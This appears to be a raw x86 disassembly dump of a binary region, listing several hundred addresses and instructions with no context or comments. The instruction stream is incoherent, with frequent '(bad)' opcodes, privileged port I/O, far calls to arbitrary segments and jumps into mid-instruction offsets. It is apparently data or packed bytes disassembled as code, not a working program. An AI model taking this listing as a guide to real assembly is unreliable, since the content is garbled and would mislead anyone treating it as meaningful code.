  4c0ada:	push   ss
  4c0adb:	into   
  4c0adc:	stos   BYTE PTR es:[edi],al
  4c0add:	or     al,0x48
  4c0adf:	or     al,0x31
  4c0ae1:	hlt    
  4c0ae2:	cmp    BYTE PTR [ebp*8+0x617d05eb],ah
  4c0ae9:	(bad)  
  4c0aea:	adc    bl,BYTE PTR [esi+0x1859e73d]
  4c0af0:	push   cs
  4c0af1:	popa   
  4c0af2:	test   DWORD PTR [esi+0x16],edx
  4c0af5:	adc    DWORD PTR [ecx],0x81222758
  4c0afb:	lods   eax,DWORD PTR ds:[esi]
  4c0afc:	jmp    0x4c0b5d
  4c0afe:	push   ebx
  4c0aff:	stos   DWORD PTR es:[edi],eax
  4c0b00:	test   BYTE PTR [edi],al
  4c0b02:	fcom   DWORD PTR [ebx]
  4c0b04:	pop    ebx
  4c0b05:	xchg   ebx,eax
  4c0b06:	inc    ebp
  4c0b07:	pusha  
  4c0b08:	data16 lahf 
  4c0b0a:	pop    eax
  4c0b0b:	pop    esp
  4c0b0c:	or     DWORD PTR [eax+eax*8+0x7ec1dfd4],ecx
  4c0b13:	mov    eax,ds:0x13fb65a7
  4c0b18:	push   ebx
  4c0b19:	aam    0xb
  4c0b1b:	xchg   esi,eax
  4c0b1c:	push   edi
  4c0b1d:	ret    0x43
  4c0b20:	sub    bh,BYTE PTR [edi-0xa]
  4c0b23:	add    al,0x11
  4c0b25:	xchg   ebp,eax
  4c0b26:	dec    eax
  4c0b27:	jmp    0x4c0b5a
  4c0b29:	scas   eax,DWORD PTR es:[edi]
  4c0b2a:	add    ah,BYTE PTR [ecx+0xc379526]
  4c0b30:	cmp    al,0xe5
  4c0b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c0b33:	dec    esp
  4c0b34:	sub    BYTE PTR [eax],bl
  4c0b36:	and    bh,BYTE PTR [eax]
  4c0b38:	xor    DWORD PTR [esi+0x504f9806],esp
  4c0b3e:	imul   BYTE PTR [ecx]
  4c0b40:	or     BYTE PTR [edi],ah
  4c0b42:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4c0b44:	clc    
  4c0b45:	push   edi
  4c0b46:	pop    ecx
  4c0b47:	cmp    BYTE PTR [edx-0x18],0x3d
  4c0b4b:	aam    0x63
  4c0b4d:	fstp   DWORD PTR [edx+0x214cca66]
  4c0b53:	inc    edx
  4c0b54:	adc    al,dh
  4c0b56:	mov    ah,0xc5
  4c0b58:	push   es
  4c0b59:	mov    ds:0x95c0bc69,al
  4c0b5e:	pop    ss
  4c0b5f:	lea    ebp,[eax]
  4c0b61:	pop    esp
  4c0b62:	mov    al,ds:0x2d105507
  4c0b67:	inc    esp
  4c0b68:	retf   
  4c0b69:	dec    esp
  4c0b6a:	dec    esp
  4c0b6b:	int    0x45
  4c0b6d:	fidiv  WORD PTR [esp+ecx*1]
  4c0b70:	aaa    
  4c0b71:	inc    edi
  4c0b72:	je     0x4c0bb3
  4c0b74:	mov    dl,0x6c
  4c0b76:	add    ecx,edx
  4c0b78:	pop    ebp
  4c0b79:	xor    bl,BYTE PTR [ebp-0x3c]
  4c0b7c:	sbb    al,0x69
  4c0b7e:	mov    ebx,0xe40ecd2d
  4c0b83:	dec    ebp
  4c0b84:	aam    0xe
  4c0b86:	arpl   WORD PTR es:[esi],ax
  4c0b89:	push   ebp
  4c0b8a:	adc    al,0x67
  4c0b8c:	sbb    al,0xed
  4c0b8e:	dec    ebx
  4c0b8f:	push   es
  4c0b90:	mov    dh,0xf3
  4c0b92:	ins    DWORD PTR es:[edi],dx
  4c0b93:	les    edx,FWORD PTR [esi-0x49]
  4c0b96:	sub    eax,DWORD PTR [ebx+eax*1+0x39]
  4c0b9a:	inc    edi
  4c0b9b:	dec    esi
  4c0b9c:	dec    eax
  4c0b9d:	mov    DWORD PTR [edi],eax
  4c0b9f:	or     al,0x61
  4c0ba1:	add    cx,ax
  4c0ba4:	les    edx,FWORD PTR [edi+0x38538d2]
  4c0baa:	jmp    0x4c0bba
  4c0bac:	dec    edx
  4c0bad:	aaa    
  4c0bae:	and    ecx,DWORD PTR [edx]
  4c0bb0:	and    edi,DWORD PTR [eax]
  4c0bb2:	rcr    BYTE PTR [edi+eiz*1+0x64603599],1
  4c0bb9:	mov    ebp,0xacba6062
  4c0bbe:	push   edi
  4c0bbf:	pusha  
  4c0bc0:	pusha  
  4c0bc1:	pusha  
  4c0bc2:	and    esi,DWORD PTR [ecx]
  4c0bc4:	dec    edx
  4c0bc5:	arpl   WORD PTR [eax+esi*4+0x7],ax
  4c0bc9:	pop    esi
  4c0bca:	fs ret 0x4868
  4c0bce:	ror    DWORD PTR [eax+0x31],0xd5
  4c0bd2:	xor    al,0xd4
  4c0bd4:	inc    ebp
  4c0bd5:	arpl   WORD PTR [ebp+0x3b],dx
  4c0bd8:	sti    
  4c0bd9:	mov    al,0x39
  4c0bdb:	into   
  4c0bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c0bdd:	(bad)
  4c0be0:	cli    
  4c0be1:	loopne 0x4c0c38
  4c0be3:	les    esp,FWORD PTR [edx+0x12]
  4c0be6:	ja     0x4c0c1c
  4c0be8:	add    al,0x60
  4c0bea:	jmp    FWORD PTR [edx+0x63]
  4c0bed:	retf   0xf860
  4c0bf0:	cmc    
  4c0bf1:	mov    bl,0xa2
  4c0bf3:	(bad)  
  4c0bf4:	out    dx,al
  4c0bf5:	xor    ah,ah
  4c0bf7:	sbb    BYTE PTR [esi-0x4d],ch
  4c0bfa:	xchg   edx,eax
  4c0bfb:	out    0x10,eax
  4c0bfd:	popf   
  4c0bfe:	push   ss
  4c0bff:	push   es
  4c0c00:	dec    ecx
  4c0c01:	cmp    bh,BYTE PTR [ebp-0x3785a5e3]
  4c0c07:	add    ebx,edx
  4c0c09:	push   esp
  4c0c0a:	(bad)  [edi+0x61419980]
  4c0c10:	xchg   ebp,eax
  4c0c11:	in     eax,0x2d
  4c0c13:	sbb    bl,BYTE PTR [edi-0x4d]
  4c0c16:	sbb    BYTE PTR [edi+0x6f],bh
  4c0c19:	mov    eax,0x7a9a9a38
  4c0c1e:	push   eax
  4c0c1f:	js     0x4c0bc5
  4c0c21:	jne    0x4c0c87
  4c0c23:	xor    al,BYTE PTR [ebp+0x21]
  4c0c26:	adc    al,0xff
  4c0c28:	ficomp WORD PTR [ebx+0x38]
  4c0c2b:	pop    eax
  4c0c2c:	inc    eax
  4c0c2d:	je     0x4c0c85
  4c0c2f:	pop    ss
  4c0c30:	push   edx
  4c0c31:	push   0x75d9ef70
  4c0c36:	inc    edi
  4c0c37:	mov    ecx,0x56376848
  4c0c3c:	(bad)  [ecx]
  4c0c3e:	in     eax,dx
  4c0c3f:	push   eax
  4c0c40:	add    DWORD PTR [ebp+0x23],esi
  4c0c43:	pop    ds
  4c0c44:	cmp    esp,ebp
  4c0c46:	je     0x4c0c59
  4c0c48:	sbb    eax,0xa6b4acab
  4c0c4d:	pop    esi
  4c0c4e:	shl    BYTE PTR [eax],1
  4c0c50:	xchg   ebx,eax
  4c0c51:	jne    0x4c0c42
  4c0c53:	pop    ss
  4c0c54:	and    al,0x10
  4c0c56:	jns    0x4c0c49
  4c0c58:	mov    ebx,0xbe748d20
  4c0c5d:	(bad)  
  4c0c5e:	in     al,0x65
  4c0c60:	pop    es
  4c0c61:	mov    DWORD PTR [ecx-0x75],eax
  4c0c64:	(bad)  
  4c0c65:	shl    BYTE PTR [esi+0x4884e0d6],cl
  4c0c6b:	in     al,0x48
  4c0c6d:	pushf  
  4c0c6e:	push   eax
  4c0c6f:	sbb    eax,0xaa27d872
  4c0c74:	lods   al,BYTE PTR ds:[esi]
  4c0c75:	sbb    BYTE PTR [esi-0x4b],dl
  4c0c78:	push   0xffffffaf
  4c0c7a:	loope  0x4c0c24
  4c0c7c:	pop    ds
  4c0c7d:	pop    eax
  4c0c7e:	mov    ds:0x93548f60,eax
  4c0c83:	adc    edi,0x744f5a68
  4c0c89:	pop    ds
  4c0c8a:	mov    al,0xac
  4c0c8c:	push   ebp
  4c0c8d:	mov    ds:0x82b48cbf,al
  4c0c92:	cld    
  4c0c93:	cmp    eax,0x4af55ba8
  4c0c98:	or     ch,bh
  4c0c9a:	inc    DWORD PTR [esi]
  4c0c9c:	inc    ecx
  4c0c9d:	popa   
  4c0c9e:	je     0x4c0cb7
  4c0ca0:	cmp    esi,DWORD PTR [edi+edx*4+0x4fa55fa2]
  4c0ca7:	push   edx
  4c0ca8:	push   edi
  4c0ca9:	enter  0x2e60,0xd8
  4c0cad:	inc    eax
  4c0cae:	(bad)  
  4c0caf:	and    eax,0x43bd6975
  4c0cb4:	scas   al,BYTE PTR es:[edi]
  4c0cb5:	cmp    al,0x83
  4c0cb7:	leave  
  4c0cb8:	xchg   ecx,eax
  4c0cb9:	jne    0x4c0cdb
  4c0cbb:	(bad)  
  4c0cbc:	rcl    DWORD PTR [edx],1
  4c0cbe:	daa    
  4c0cbf:	sub    edi,DWORD PTR [ebx-0x75]
  4c0cc2:	enter  0x5eb2,0x9b
  4c0cc6:	aaa    
  4c0cc7:	mov    ch,BYTE PTR [ebp+0x4d]
  4c0cca:	xchg   esi,eax
  4c0ccb:	cmc    
  4c0ccc:	loope  0x4c0cdb
  4c0cce:	add    DWORD PTR [ebp+0x1],0x4a
  4c0cd2:	daa    
  4c0cd3:	mov    eax,ds:0xd245d10b
  4c0cd8:	sub    bh,BYTE PTR [ebp+0x615e13d9]
  4c0cde:	and    BYTE PTR [edx+eax*2+0x50],bl
  4c0ce2:	(bad)  [eax+0x4d]
  4c0ce5:	pop    ebp
  4c0ce6:	loopne 0x4c0ccc
  4c0ce8:	add    dh,BYTE PTR [esi]
  4c0cea:	push   es
  4c0ceb:	dec    ebx
  4c0cec:	add    ch,BYTE PTR [esi+0x701fd24]
  4c0cf2:	aas    
  4c0cf3:	cmc    
  4c0cf4:	jns    0x4c0d47
  4c0cf6:	and    al,0xcd
  4c0cf8:	mov    esi,0x9c2979e4
  4c0cfd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c0cfe:	xchg   edi,eax
  4c0cff:	xchg   ecx,eax
  4c0d00:	sub    BYTE PTR [ebx-0x42],dl
  4c0d03:	mov    bh,0x80
  4c0d05:	add    DWORD PTR [ecx+edi*8-0x26fe54be],ebx
  4c0d0c:	dec    esp
  4c0d0d:	push   0xb17c1820
  4c0d12:	(bad)  
  4c0d13:	outs   dx,DWORD PTR ds:[esi]
  4c0d14:	add    DWORD PTR ds:0x205d3861,ebp
  4c0d1a:	je     0x4c0d24
  4c0d1c:	lea    edx,[esi]
  4c0d1e:	clc    
  4c0d1f:	or     edx,esi
  4c0d21:	ds sbb al,0x52
  4c0d24:	push   esi
  4c0d25:	mov    esi,edx
  4c0d27:	sub    ch,cl
  4c0d29:	push   esp
  4c0d2a:	ret    0x5188
  4c0d2d:	mov    dl,0x88
  4c0d2f:	push   ebx
  4c0d30:	pop    ecx
  4c0d31:	mov    esi,DWORD PTR [ecx+ebp*1-0x20]
  4c0d35:	pop    ebp
  4c0d36:	(bad)  
  4c0d37:	xor    bh,ch
  4c0d39:	or     eax,0x44bcdd63
  4c0d3e:	dec    ebx
  4c0d3f:	aad    0x51
  4c0d41:	push   edi
  4c0d42:	xor    ch,BYTE PTR [ebx]
  4c0d44:	push   ecx
  4c0d45:	push   es
  4c0d46:	outs   dx,BYTE PTR ds:[esi]
  4c0d47:	and    DWORD PTR [ebp-0x32fcaf8f],ebp
  4c0d4d:	push   ebx
  4c0d4e:	pop    ecx
  4c0d4f:	div    DWORD PTR [eax-0x7e]
  4c0d52:	dec    edx
  4c0d53:	cmp    al,0x23
  4c0d55:	add    BYTE PTR [ebx-0x6f8dd8b8],ch
  4c0d5b:	adc    BYTE PTR [edx],bh
  4c0d5d:	pop    ebx
  4c0d5e:	ja     0x4c0d3b
  4c0d60:	sbb    bh,BYTE PTR [eax+0x5101bb80]
  4c0d66:	sbb    eax,DWORD PTR [esi+0x4814b214]
  4c0d6c:	and    BYTE PTR [edi],dh
  4c0d6e:	cmp    BYTE PTR [ecx],0x2c
  4c0d71:	cdq    
  4c0d72:	dec    esi
  4c0d73:	xchg   edi,eax
  4c0d74:	pop    esp
  4c0d75:	stc    
  4c0d76:	loopne 0x4c0d78
  4c0d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c0d79:	or     BYTE PTR [edx],bh
  4c0d7b:	and    al,0x2d
  4c0d7d:	imul   eax,eax,0xffffffd2
  4c0d80:	inc    eax
  4c0d81:	fwait
  4c0d82:	xchg   BYTE PTR [ecx+ebp*4-0x51],al
  4c0d86:	sub    cl,ah
  4c0d88:	jbe    0x5bc3a10d
  4c0d8e:	add    eax,DWORD PTR [esi+0x18]
  4c0d91:	stos   DWORD PTR es:[edi],eax
  4c0d92:	mov    dl,0x34
  4c0d94:	call   0xce4e9709
  4c0d99:	pop    eax
  4c0d9a:	(bad)  
  4c0d9b:	adc    al,0xd5
  4c0d9d:	add    al,0xdc
  4c0d9f:	or     DWORD PTR [ecx-0x15],0xa6632530
  4c0da6:	xor    eax,0x22298910
  4c0dab:	and    eax,DWORD PTR [ebp-0x78]
  4c0dae:	xchg   edx,eax
  4c0daf:	mov    ah,0x83
  4c0db1:	push   edx
  4c0db2:	and    dl,BYTE PTR [eax]
  4c0db4:	cwde   
  4c0db5:	dec    esp
  4c0db6:	test   DWORD PTR [ecx],ebx
  4c0db8:	sub    al,0xd7
  4c0dba:	and    BYTE PTR [ecx+0x18],al
  4c0dbd:	sbb    eax,DWORD PTR [esi+0x2c160f94]
  4c0dc3:	or     DWORD PTR [ebp-0xab5636a],0x26
  4c0dca:	jl     0x4c0d52
  4c0dcc:	mov    bl,0x1d
  4c0dce:	push   es
  4c0dcf:	hlt    
  4c0dd0:	mov    al,ds:0x704a13ba
  4c0dd5:	pop    esp
  4c0dd6:	mov    cl,BYTE PTR ds:0x44a25335
  4c0ddc:	push   ecx
  4c0ddd:	inc    ebx
  4c0dde:	add    eax,DWORD PTR [ecx]
  4c0de0:	and    esi,ebp
  4c0de2:	imul   BYTE PTR [ebx]
  4c0de4:	fs add cl,0x47
  4c0de8:	loop   0x4c0dbf
  4c0dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c0deb:	pop    esp
  4c0dec:	cmp    DWORD PTR ds:0xa0e54dcd,esi
  4c0df2:	call   0xf38:0x15e45458
  4c0df9:	xchg   DWORD PTR [esi],edi
  4c0dfb:	lock shl BYTE PTR [ecx+esi*1+0x7e],0xf
  4c0e01:	pop    eax
  4c0e02:	adc    al,0x18
  4c0e04:	rcl    ebx,0xf8
  4c0e07:	inc    ecx
  4c0e08:	sbb    DWORD PTR [ebx-0x23],edi
  4c0e0b:	call   0x29c3:0x4e212000
  4c0e12:	(bad)  
  4c0e13:	or     BYTE PTR [ebx+0x61],0x28
  4c0e17:	out    0x1e,eax
  4c0e19:	pop    es
  4c0e1a:	lds    edi,FWORD PTR [ecx+0x5e]
  4c0e1d:	inc    eax
  4c0e1e:	push   es
  4c0e1f:	push   edx
  4c0e20:	fs das 
  4c0e22:	dec    esp
  4c0e23:	cmp    BYTE PTR [edi],al
  4c0e25:	xor    ah,BYTE PTR [eax]
  4c0e27:	call   0x10f19306
  4c0e2c:	jo     0x4c0e51
  4c0e2e:	out    dx,al
  4c0e2f:	sbb    al,0x8a
  4c0e31:	fwait
  4c0e32:	sub    BYTE PTR [ecx+0x5a],al
  4c0e35:	xor    DWORD PTR [eax],0x560e1757
  4c0e3b:	push   eax
  4c0e3c:	jb     0x4c0dff
  4c0e3e:	lahf   
  4c0e3f:	loop   0x4c0e52
  4c0e41:	test   ch,al
  4c0e43:	xchg   ah,bl
  4c0e45:	(bad)  
  4c0e46:	lahf   
  4c0e47:	pop    esp
  4c0e48:	pushf  
  4c0e49:	mov    esp,edx
  4c0e4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c0e4c:	xchg   ecx,eax
  4c0e4d:	sub    BYTE PTR [ecx-0x3b],ch
  4c0e50:	xor    BYTE PTR [ecx+0x2548905c],dh
  4c0e56:	mov    eax,DWORD PTR [ebx]
  4c0e58:	jne    0x4c0e85
  4c0e5a:	xchg   edx,eax
  4c0e5b:	jg     0x4c0e4e
  4c0e5d:	pop    DWORD PTR [eax+esi*1+0x8]
  4c0e61:	iret   
  4c0e62:	pop    ecx
  4c0e63:	pop    eax
  4c0e64:	in     al,0x8b
  4c0e66:	add    BYTE PTR [ebp-0x14c9d60a],bl
  4c0e6c:	cmp    BYTE PTR [ebx],bl
  4c0e6e:	dec    ebp
  4c0e6f:	adc    al,0x13
  4c0e71:	imul   ebx,DWORD PTR [edi],0xeb065342
  4c0e77:	sub    dh,BYTE PTR [ebx]
  4c0e79:	add    BYTE PTR [ebp+0x7b],bl
  4c0e7c:	or     esp,esp
  4c0e7e:	and    dl,BYTE PTR [eax]
  4c0e80:	jae    0x4c0e9e
  4c0e82:	test   eax,0xb3588bc2
  4c0e87:	retf   0x2848
  4c0e8a:	lock pop ss
  4c0e8c:	add    ch,ah
  4c0e8e:	dec    esp
  4c0e8f:	mov    ds:0xb68d7c14,al
  4c0e94:	mov    al,0x80
  4c0e96:	lock add eax,0x51178bf5
  4c0e9c:	or     al,BYTE PTR [ebx+0x1]
  4c0e9f:	sub    edi,DWORD PTR [edi+0x2d]
  4c0ea2:	jg     0x4c0e66
  4c0ea4:	cmp    al,0x63
  4c0ea6:	sbb    DWORD PTR [edi],ebp
  4c0ea8:	mov    esi,0x2d703a6
  4c0ead:	nop
  4c0eae:	xchg   ebp,edx
  4c0eb0:	add    DWORD PTR [eax+edi*4-0x66283388],esp
  4c0eb7:	dec    eax
  4c0eb8:	push   cs
  4c0eb9:	jmp    0x4c0e46
  4c0ebb:	out    0x45,eax
  4c0ebd:	push   0xd0c53c4c
  4c0ec2:	or     al,0x63
  4c0ec4:	inc    ebp
  4c0ec5:	lds    ebp,FWORD PTR [ecx]
  4c0ec7:	je     0x4c0edb
  4c0ec9:	adc    dh,BYTE PTR [edx]
  4c0ecb:	enter  0x2848,0xc8
  4c0ecf:	cmp    eax,0x181102ae
  4c0ed4:	xor    eax,0x21377413
  4c0ed9:	mov    dh,0x33
  4c0edb:	imul   ecx,DWORD PTR [ebp+esi*2-0x77],0x2
  4c0ee0:	jns    0x4c0ee2
  4c0ee2:	sub    edx,DWORD PTR [esi]
  4c0ee4:	nop
  4c0ee5:	add    ebx,ecx
  4c0ee7:	(bad)  
  4c0ee9:	shr    DWORD PTR [ecx],0x5f
  4c0eec:	lock data16 inc BYTE PTR [esi]
  4c0ef0:	sbb    cl,ch
  4c0ef2:	push   ebx
  4c0ef3:	cmp    esp,edx
  4c0ef5:	xor    al,0x2a
  4c0ef7:	jmp    0x4c0ecf
  4c0ef9:	test   al,0x20
  4c0efb:	adc    dl,BYTE PTR [ebx+0xd]
  4c0efe:	or     edx,DWORD PTR [ecx*1+0x53c58993]
  4c0f05:	outs   dx,BYTE PTR ds:[esi]
  4c0f06:	test   DWORD PTR [ecx-0x44],esp
  4c0f09:	mov    dl,0xfd
  4c0f0b:	pop    ss
  4c0f0c:	push   eax
  4c0f0d:	cmp    BYTE PTR [esi],ah
  4c0f0f:	add    edi,edx
  4c0f11:	adc    dl,BYTE PTR [esi+0x53]
  4c0f14:	push   ecx
  4c0f15:	mov    ecx,0x43e16059
  4c0f1a:	add    BYTE PTR [ebp+0x4],cl
  4c0f1d:	xchg   DWORD PTR [edi-0x37],esi
  4c0f20:	nop
  4c0f21:	imul   esi,DWORD PTR ds:0x550c45ab,0x39ee068e
  4c0f2b:	or     eax,0x4a992a08
  4c0f30:	cld    
  4c0f31:	test   BYTE PTR [edx],cl
  4c0f33:	inc    esp
  4c0f34:	cmp    ecx,DWORD PTR [edx+0x485daf14]
  4c0f3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c0f3b:	add    eax,0x206a148c
  4c0f40:	push   edx
  4c0f41:	ja     0x4c0f48
  4c0f43:	repnz adc ah,bl
  4c0f46:	or     al,dl
  4c0f48:	sub    eax,0xb40fb2d4
  4c0f4d:	inc    esi
  4c0f4e:	lahf   
  4c0f4f:	sub    esp,ebx
  4c0f51:	fwait
  4c0f52:	adc    edx,eax
  4c0f54:	call   0x690cade2
  4c0f59:	xchg   BYTE PTR [ebp+0x4a388047],ch
  4c0f5f:	adc    al,0x52
  4c0f61:	shl    BYTE PTR [edx+0x6],cl
  4c0f64:	jecxz  0x4c0ee9
  4c0f66:	pop    esp
  4c0f67:	xor    BYTE PTR [edx+0x40d8682f],0x48
  4c0f6e:	cmp    eax,0x8d102b6e
  4c0f73:	in     eax,0x57
  4c0f75:	hlt    
  4c0f76:	rcl    BYTE PTR [ebp+0x33a0298],0x93
  4c0f7d:	inc    ecx
  4c0f7e:	int3   
  4c0f7f:	inc    ebx
  4c0f80:	loope  0x4c0f50
  4c0f82:	jnp    0x4c0f53
  4c0f84:	cmp    ecx,0x46876a11
  4c0f8a:	(bad)  
  4c0f8c:	push   ecx
  4c0f8d:	xor    ah,BYTE PTR [edi+0xd71518d]
  4c0f93:	test   DWORD PTR [edx],ebp
  4c0f95:	ins    BYTE PTR es:[edi],dx
  4c0f96:	xor    DWORD PTR [ebp+0x15],0x78
  4c0f9a:	jo     0x4c0f6b
  4c0f9c:	adc    eax,0xeee36eb6
  4c0fa1:	inc    edi
  4c0fa2:	stos   DWORD PTR es:[edi],eax
  4c0fa3:	or     al,0xb6
  4c0fa5:	add    eax,DWORD PTR [esi+0x56e33c60]
  4c0fab:	das    
  4c0fac:	mov    eax,0x9b001f18
  4c0fb1:	popa   
  4c0fb2:	pop    ss
  4c0fb3:	sbb    eax,DWORD PTR [ebx]
  4c0fb5:	sub    ecx,esi
  4c0fb7:	pop    ds
  4c0fb8:	push   0x29489d40
  4c0fbd:	adc    dh,cl
  4c0fbf:	mov    ch,0xbb
  4c0fc1:	in     eax,dx
  4c0fc2:	mov    dh,0x6
  4c0fc4:	(bad)  
  4c0fc5:	push   edx
  4c0fc6:	push   edi
  4c0fc7:	add    esi,esp
  4c0fc9:	in     al,0x3b
  4c0fcb:	ret    
  4c0fcc:	leave  
  4c0fcd:	neg    DWORD PTR [ebx]
  4c0fcf:	and    al,0x6
  4c0fd1:	push   esi
  4c0fd2:	push   ecx
  4c0fd3:	xor    eax,0xc81f248a
  4c0fd8:	cs pop ds
  4c0fda:	rep stos BYTE PTR es:[edi],al
  4c0fdc:	add    al,0x6b
  4c0fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c0fdf:	repz mov ch,0xd
  4c0fe2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c0fe3:	jns    0x4c104f
  4c0fe5:	mov    eax,0xeac1d6d3
  4c0fea:	sti    
  4c0feb:	adc    dh,BYTE PTR [edx+ebx*8]
  4c0fee:	ret    0xce04
  4c0ff1:	jnp    0x4c0fe1
  4c0ff3:	add    DWORD PTR ds:0xdf62edb,esi
  4c0ff9:	push   ebx
  4c0ffa:	jns    0x4c1046
  4c0ffc:	push   edi
  4c0ffd:	push   edx
  4c0ffe:	out    dx,al
  4c0fff:	(bad)  
  4c1000:	push   eax
  4c1001:	xor    eax,0xf6380063
  4c1006:	imul   ebx,DWORD PTR [ecx+esi*1+0x4b6805ce],0xe05783b6
  4c1011:	push   0x925022a8
  4c1016:	cmp    al,0x84
  4c1018:	cmp    al,0x7c
  4c101a:	repz pushw es
  4c101d:	nop
  4c101e:	jp     0x4c1070
  4c1020:	mov    ecx,0x2a21e54
  4c1025:	jne    0x4c1083
  4c1027:	and    ebp,0x9a248f87
  4c102d:	cmp    eax,0xfdc1a7f3
  4c1032:	mov    al,0x9
  4c1034:	out    dx,al
  4c1035:	jb     0x4c0fc7
  4c1037:	fwait
  4c1038:	out    dx,eax
  4c1039:	addr16 or al,0x47
  4c103c:	test   DWORD PTR [edi+0x72],edi
  4c103f:	enter  0xa94f,0x68
  4c1043:	and    esi,ebx
  4c1045:	xchg   edi,eax
  4c1046:	push   es
  4c1047:	mov    ds:0x2472421,eax
  4c104c:	(bad)  
  4c104e:	lahf   
  4c104f:	sub    eax,0x463d05e4
  4c1054:	mov    al,0x3f
  4c1056:	mov    bh,0xd3
  4c1058:	push   edx
  4c1059:	push   esi
  4c105a:	xchg   edi,eax
  4c105b:	inc    edx
  4c105c:	xchg   ah,ah
  4c105e:	push   es
  4c105f:	xchg   ebx,eax
  4c1060:	mov    al,BYTE PTR [eax]
  4c1062:	mov    ebx,0x5df17b40
  4c1067:	push   ebx
  4c1068:	cmp    al,0xba
  4c106a:	push   ecx
  4c106b:	push   edx
  4c106c:	ror    DWORD PTR ds:0x9b53c93b,cl
  4c1072:	in     al,0x2
  4c1074:	out    dx,eax
  4c1075:	push   0x3f
  4c1077:	push   es
  4c1078:	sbb    DWORD PTR [ebx+0x7244b47c],esi
  4c107e:	add    DWORD PTR [ebx],edi
  4c1080:	add    ch,ch
  4c1082:	mov    ds:0x553140cf,al
  4c1087:	aaa    
  4c1088:	xor    al,0x1
  4c108a:	xor    esi,DWORD PTR [edi-0x21]
  4c108d:	(bad)  
  4c108e:	xor    BYTE PTR [ecx-0x157e33b4],al
  4c1094:	adc    dl,BYTE PTR [esi]
  4c1096:	je     0x4c10b4
  4c1098:	xor    ecx,DWORD PTR [edx]
  4c109a:	add    eax,0xa0ea83c4
  4c109f:	inc    esi
  4c10a0:	les    ebx,FWORD PTR [edi+0x1d]
  4c10a3:	xchg   ebx,eax
  4c10a4:	test   eax,0xf83c053d
  4c10a9:	test   DWORD PTR [edx],eax
  4c10ab:	ins    DWORD PTR es:[edi],dx
  4c10ac:	dec    ebx
  4c10ad:	xor    eax,DWORD PTR [edi]
  4c10af:	test   BYTE PTR [esi],0xfe
  4c10b2:	xchg   edx,eax
  4c10b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c10b4:	sbb    al,BYTE PTR [ebx]
  4c10b6:	test   BYTE PTR [ebx],al
  4c10b8:	je     0x4c103c
  4c10ba:	scas   eax,DWORD PTR es:[edi]
  4c10bb:	pop    ds
  4c10bc:	inc    ecx
  4c10bd:	test   ax,0xff45
  4c10c1:	lahf   
  4c10c2:	stc    
  4c10c3:	cmp    al,0x4f
  4c10c5:	sti    
  4c10c6:	ss scas al,BYTE PTR es:[edi]
  4c10c8:	jmp    0x4c10d0
  4c10ca:	idiv   DWORD PTR [esi-0x3013bc24]
  4c10d0:	jnp    0x4c1070
  4c10d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c10d3:	pop    es
  4c10d4:	push   esp
  4c10d5:	pop    ss
  4c10d6:	sahf   
  4c10d7:	mov    BYTE PTR es:[ebp+0x19],ch
  4c10db:	push   eax
  4c10dc:	loopne 0x4c1157
  4c10de:	push   es
  4c10df:	sub    BYTE PTR [edx+0x6d372ce4],bl
  4c10e5:	je     0x4c1143
  4c10e7:	or     eax,0x26429d54
  4c10ec:	nop
  4c10ed:	popf   
  4c10ee:	push   es
  4c10ef:	or     BYTE PTR ds:0xa8ee92a5,cl
  4c10f5:	add    DWORD PTR [ecx],ecx
  4c10f7:	dec    edi
  4c10f8:	or     bh,BYTE PTR [ebx+0x5]
  4c10fb:	pslld  mm2,QWORD PTR [ecx]
  4c10fe:	or     ecx,DWORD PTR [esp+ebp*1]
  4c1101:	in     eax,dx
  4c1102:	push   cs
  4c1103:	dec    edx
  4c1104:	push   es
  4c1105:	push   0xe
  4c1107:	repz jns 0x4c10a8
  4c110a:	out    0xf6,al
  4c110c:	in     al,dx
  4c110d:	sbb    ah,bh
  4c110f:	or     BYTE PTR [esi],al
  4c1111:	out    dx,al
  4c1112:	pop    esp
  4c1113:	lock jns 0x4c1165
  4c1116:	(bad)  
  4c1117:	mov    al,BYTE PTR [esi]
  4c1119:	out    0xa8,al
  4c111b:	in     eax,dx
  4c111c:	outs   dx,DWORD PTR ds:[esi]
  4c111d:	or     al,0xb6
  4c111f:	inc    ecx
  4c1120:	mov    al,ds:0x10c7015
  4c1125:	test   al,0x0
  4c1127:	push   es
  4c1128:	or     al,0xd2
  4c112a:	inc    eax
  4c112b:	add    cl,BYTE PTR [eax-0x7e]
  4c112e:	rcr    BYTE PTR [esi],0xb8
  4c1131:	mov    cl,BYTE PTR [edx+ecx*1]
  4c1134:	or     ecx,DWORD PTR [ebp-0x26]
  4c1137:	imul   edx,DWORD PTR [eax],0x1a
  4c113a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c113b:	adc    BYTE PTR [edi],ch
  4c113d:	sbb    al,dh
  4c113f:	add    al,0xad
  4c1141:	pop    ss
  4c1142:	or     DWORD PTR [ebp+0x7c],ebx
  4c1145:	and    BYTE PTR [ebx-0xd9b7c0],al
  4c114b:	push   esi
  4c114c:	rol    BYTE PTR [edi-0x6f3c8f5c],0xb
  4c1153:	sub    BYTE PTR [ebx],al
  4c1155:	out    dx,eax
  4c1156:	fdiv   DWORD PTR [eax-0x77]
  4c1159:	outs   dx,DWORD PTR ds:[esi]
  4c115a:	or     BYTE PTR [edx+edx*2-0x26],bl
  4c115e:	xchg   ebp,eax
  4c115f:	mov    dl,BYTE PTR [ecx-0xe]
  4c1162:	sbb    cl,BYTE PTR [edx-0x59]
  4c1165:	aaa    
  4c1166:	jle    0x4c113d
  4c1168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c1169:	xchg   edx,eax
  4c116a:	std    
  4c116b:	sbb    DWORD PTR [edx-0x215297d7],eax
  4c1171:	pop    edx
  4c1172:	enter  0xd67,0x25
  4c1176:	jecxz  0x4c111d
  4c1178:	and    al,0xef
